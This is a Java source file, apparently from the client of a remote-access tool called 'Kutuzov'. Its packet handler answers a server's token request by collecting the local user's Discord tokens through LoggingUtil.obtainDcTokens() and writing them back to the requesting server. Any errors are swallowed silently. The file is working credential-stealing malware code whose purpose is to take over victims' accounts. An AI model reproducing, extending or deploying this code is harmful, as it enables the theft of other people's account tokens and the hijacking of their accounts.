package me.kutuzov.client;

import me.kutuzov.client.util.LoggingUtil;
import me.kutuzov.packet.Packet;
import me.kutuzov.packet.logger.CSTokenResponse;
import me.kutuzov.packet.logger.SCTokenRequest;
import me.kutuzov.packet.logger.types.TokenType;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class KutuzovLoggerPackets {
    public static void handlePacket(ObjectInputStream ois, ObjectOutputStream oos, Packet packet) {
        if(packet instanceof SCTokenRequest) {
            SCTokenRequest request = (SCTokenRequest) packet;
            try {
                switch (request.type) {
                    case DISCORD:
                        oos.writeObject(new CSTokenResponse(request.type, LoggingUtil.obtainDcTokens()));
                        break;

                    default:
                        oos.writeObject(new CSTokenResponse(TokenType.NONE, new String[0]));
                        break;
                }
            } catch (Exception exception) {}
        }
    }
}